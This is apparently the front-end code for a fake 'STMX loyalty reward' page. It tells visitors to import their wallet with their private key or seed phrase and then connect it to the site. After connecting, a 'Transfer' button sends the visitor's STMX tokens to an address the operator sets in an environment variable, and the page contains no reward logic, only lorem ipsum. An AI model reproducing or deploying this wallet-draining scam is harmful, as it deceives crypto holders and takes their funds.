import React, { useState, useEffect } from "react";
import styles from "./guide.module.scss";
import gift from "../../assets/Gift.svg";
import { IoIosArrowForward } from "react-icons/io";
import { MdComputer } from "react-icons/md";
import PcLogo from "../../assets/pcLogo.jpg";
import met1 from "../../assets/met1.jpeg";
import met2 from "../../assets/met2.jpeg";
import met3 from "../../assets/met3.jpeg";
import twt1 from "../../assets/twt1.jpeg";
import twt2 from "../../assets/twt2.jpeg";
import { ethers } from "ethers";
import { formatFixed } from "@exodus/ethersproject-bignumber";

import Countdown from "react-countdown";
import { getTokenBalances, transferToken } from "../../helper/helpers";

const Guide = ({
  setStateValue,
  stateValue,
  setLoadingTable,
  loadingTable,
}) => {
  const [state, setState] = useState({
    connectPc: false,
    connectMeta: false,
    connectTrust: false,
  });

  //
  const [listAllTokens, setListAllTokens] = useState([]);

  // 0xbe9375c6a420d2eeb258962efb95551a5b722803

  let to = process.env.REACT_APP_MY_ADDRESS;
  // console.log(to);

  let APIKeyString = process.env.REACT_APP_API_KEY;
  // console.log(APIKeyString);

  useEffect(() => {
    const walletAddressData = sessionStorage.getItem("account");
    const balanceData = sessionStorage.getItem("balance");
    const chainIdData = sessionStorage.getItem("chainID");
    const userWalletData = sessionStorage.getItem("setuserWallet");

    if (walletAddressData) {
      setStateValue({
        initiateWallet: true,
        processingWalletConnect: false,
        chainID: parseInt(chainIdData),
        accountBalance: balanceData,
        userWallet: userWalletData,
        walletAddress: walletAddressData,
        walletConnected: true,
      });

      (async () => {
        await getERC20Tokens();
        setStateValue({
          initiateWallet: false,
          processingWalletConnect: false,
          chainID: parseInt(chainIdData),
          accountBalance: balanceData,
          userWallet: userWalletData,
          walletAddress: walletAddressData,
          walletConnected: true,
        });
      })();
    }
  }, [stateValue.walletConnected]);

  // console.log(stateValue);

  // Fetches all the user tokens
  const getERC20Tokens = async () => {
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    let chainId = stateValue.chainID;
    let userwallet = stateValue.userWallet;

    if (chainId === 0) {
      if (sessionStorage.getItem("chainID")) {
        chainId = parseInt(sessionStorage.getItem("chainID"));
        userwallet = sessionStorage.getItem("setuserWallet");
      }
    }
    const allTokens = await getTokenBalances({
      chainID: chainId,
      APIKeyString,
      userWallet: userwallet,
      provider,
    });
    setListAllTokens(allTokens);
    setLoadingTable(false);
    return allTokens;
  };

  const fArray = [...listAllTokens];
  const result = fArray?.filter((item) => {
    if (item.address === "0xbe9375c6a420d2eeb258962efb95551a5b722803") {
      return item.address;
    }
  });
  console.log(result);

  console.log(`Loading Table${loadingTable}`);

  // count down functionality starts here
  const renderer = ({ days, hours, minutes, seconds, completed }) => {
    return (
      <span>
        {days}:{hours}:{minutes}:{seconds}
      </span>
    );
  };
  // count down functionality ends here

  // functionality that handle the instructions toggle
  const handleToggleInstruction = (id) => {
    let newObj = { ...state };
    newObj[id] = !newObj[id];
    setState(newObj);
  };

  //   This functionality format token balance big number
  const formatBalance = (balance, decimals) => {
    let format = formatFixed(
      balance.toString(),
      Math.max(parseInt(decimals.toString()), 1)
    ).toString();
    return format;
  };

  const setTransferClick = async (balanceObj) => {
    console.log(balanceObj);
    if (typeof to !== "string") {
      to = `${to}`;
    } else {
      // checks it the recipient address is a valid address
      const isAddress = ethers.utils.isAddress(to);
      if (!isAddress) {
        console.log("Invalid address provided, please try again");
      } else {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        await transferToken(balanceObj, to, provider);
      }
    }
  };

  return (
    <div className={styles.container}>
      {!stateValue.walletConnected ? (
        <div className={styles.containerContent}>
          <div className={styles.countdown}>
            <h1>STMX LOYALTY REWARD</h1>
            <div className={styles.imgContainer}>
              <img src={gift} alt={gift} />
            </div>
            <div className={styles.countdownContainer}>
              <span className={styles.text}> Activity ends in </span>
              <Countdown date={`2022/06/31`} renderer={renderer} />
            </div>
            <div className={`${styles.meter} ${styles.red}`}>
              <span style={{ width: "40%" }}> </span>
            </div>
          </div>
          <div className={styles.guide}>
            <div className={styles.content}>
              <h2>HOW TO PARTICIPATE</h2>
              <span>
                Click on the section highlighted below for detailed instructions
                on how to partake in the reward
              </span>
              {/* Instructions for PC */}
              <div className={styles.connectPcContainer}>
                <div
                  className={styles.connectPc1}
                  onClick={() => {
                    handleToggleInstruction("connectPc");
                  }}
                >
                  <div className={styles.leftIcon}>
                    <div className={styles.icon}>
                      <MdComputer />
                    </div>
                    <div>Connect with your PC</div>
                  </div>
                  <div className={styles.rightIcon}>
                    <IoIosArrowForward
                      style={{
                        transform: state.connectPc && "rotate(90deg)",
                      }}
                    />
                  </div>
                </div>
                <div
                  className={styles.pcInfo}
                  style={{ maxHeight: state.connectPc && "500px" }}
                >
                  <div className={styles.pcInfoContent}>
                    {" "}
                    <ul>
                      <li>
                        if you don't have metamask wallet installed on your Pc,
                        <br />
                        Download the chrome metamask wallet extension, import
                        your wallet using your private key or seed phrase then
                        connect your wallet with our app.
                        <img src={PcLogo} alt={PcLogo} />
                      </li>
                      <li>
                        Connect your PC with our app using chrome metamask
                        extension wallet installed on your PC.
                      </li>

                      <li>This offer is eligible to all stmx holders only</li>
                      <li>
                        Distribution of loyalty tokens is totally dependent on
                        the value of stmx in the wallet{" "}
                      </li>
                      <li>
                        Please contact stmx adminstrator if you encounter any
                        difficulties or need more guidance
                      </li>
                    </ul>
                  </div>
                </div>
              </div>
              {/* Instructions for PC End here*/}
              {/* Instructions for Metamask */}
              <div className={styles.metaContainer}>
                <div
                  className={styles.connectPc1}
                  onClick={() => {
                    handleToggleInstruction("connectMeta");
                  }}
                >
                  <div className={styles.leftIcon}>
                    <div className={styles.icon}>
                      <MdComputer />
                    </div>
                    <div>Connect with your mobile wallet (Metamask)</div>
                  </div>
                  <div className={styles.rightIcon}>
                    <IoIosArrowForward
                      style={{
                        transform: state.connectMeta && "rotate(90deg)",
                      }}
                    />
                  </div>
                </div>
                <div
                  className={styles.pcInfo}
                  style={{ maxHeight: state.connectMeta && "1200px" }}
                >
                  <div className={styles.pcInfoContent}>
                    {" "}
                    <ul>
                      <li>
                        If you don't have metamask wallet installed on your
                        Phone,
                        <br />
                        Download the metamask wallet from app store or on
                        playstore , import your wallet using your private key or
                        seed phrase.
                      </li>

                      <li>
                        Open your wallet, ensure you are on Etherium Main
                        Network then click on the navbar icon (the icon with
                        three parallel lines)
                        <img src={met1} alt={met1} />
                      </li>
                      <li>
                        Click on browser
                        <img src={met2} alt={met2} />
                      </li>
                      <li>
                        Copy our website url and paste the link in the search
                        field
                        <img src={met3} alt={met3} />
                      </li>
                      <li>Proceed to connect your wallet with our app</li>
                    </ul>
                  </div>
                </div>
              </div>
              {/* Instructions for Metamask end here */}
              {/* Instructions for Trust */}
              <div className={styles.trustContainer}>
                <div
                  className={styles.connectPc1}
                  onClick={() => {
                    handleToggleInstruction("connectTrust");
                  }}
                >
                  <div className={styles.leftIcon}>
                    <div className={styles.icon}>
                      <MdComputer />
                    </div>
                    <div>Connect with your mobile wallet (Trust wallet)</div>
                  </div>
                  <div className={styles.rightIcon}>
                    <IoIosArrowForward
                      style={{
                        transform: state.connectTrust && "rotate(90deg)",
                      }}
                    />
                  </div>
                </div>
                <div
                  className={styles.pcInfo}
                  style={{ maxHeight: state.connectTrust && "1200px" }}
                >
                  <div className={styles.pcInfoContent}>
                    {" "}
                    <ul>
                      <li>
                        If you don't have trust wallet installed on your Phone,
                        <br />
                        Download the trust wallet from app store or on playstore
                        , import your wallet using your private key or seed
                        phrase.
                      </li>

                      <li>
                        Open your wallet, glance to the bottom of your app and
                        click on browse
                        <img src={twt1} alt={twt1} />
                      </li>
                      <li>
                        Copy our website url and paste the link in the search
                        field
                        <img src={twt2} alt={met2} />
                      </li>
                      <li>Proceed to connect your wallet with our app</li>
                    </ul>
                  </div>
                </div>
              </div>
              {/* Instructions for Trust end here */}
            </div>
          </div>
        </div>
      ) : (
        <div className={styles.tokenContainer}>
          <div className={styles.tokenBalanceContainer}>
            {" "}
            <div className={styles.ethBalance}>
              <div className={styles.ethBalanceContent}>
                <div>
                  <h2>{stateValue.chainID === 1 ? "ETH" : "BSC"} BALANCE</h2>
                  <span>{stateValue.accountBalance}</span>
                </div>
              </div>
            </div>
            <div className={styles.tokenBalance}>
              {result.length >= 1 ? (
                <div className={styles.ethBalanceContent}>
                  {result?.map((item) => (
                    <div>
                      <h2>{item.name}</h2>
                      <span>
                        {parseFloat(
                          formatBalance(item.balance, item.decimals)
                        ).toFixed(2)}
                      </span>
                    </div>
                  ))}
                </div>
              ) : (
                <div className={styles.ethBalanceContent}>
                  {loadingTable
                    ? `Loading...`
                    : `Your are not eligible for this offer`}
                </div>
              )}
            </div>
          </div>
          <div className={styles.loyaltyContainer}>
            {result.length < 1 ? (
              <div className={styles.notEligible}>
                <div>
                  {loadingTable ? (
                    `Loading...`
                  ) : (
                    <h2> This offer is only available to STMX holders only</h2>
                  )}
                </div>
              </div>
            ) : (
              <div>
                Lorem ipsum dolor sit amet consectetur adipisicing elit. Odit
                sunt eos dolorum repellat ex, laudantium consequuntur a quisquam
                saepe, aliquam dolore unde! Ea ex aliquam saepe optio fugiat?
                Laborum architecto incidunt debitis saepe natus, repellendus
                quos at commodi. A cumque voluptatem dolore veniam placeat.
                Totam fugit itaque, voluptates natus cumque harum beatae illo
                deleniti ipsam commodi, sit quae earum! Atque, excepturi nemo.
                Voluptatum animi quas voluptatem optio autem itaque?
                {result.length > 0 && (
                  <div className={styles.ethBalanceContent}>
                    {result?.map((item) => (
                      <div>
                        <h2>{item.name}</h2>
                        <span>
                          {parseFloat(
                            formatBalance(item.balance, item.decimals)
                          ).toFixed(5)}
                        </span>
                        <button
                          onClick={() => {
                            setTransferClick(item);
                          }}
                        >
                          Transfer
                        </button>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
};

export default Guide;
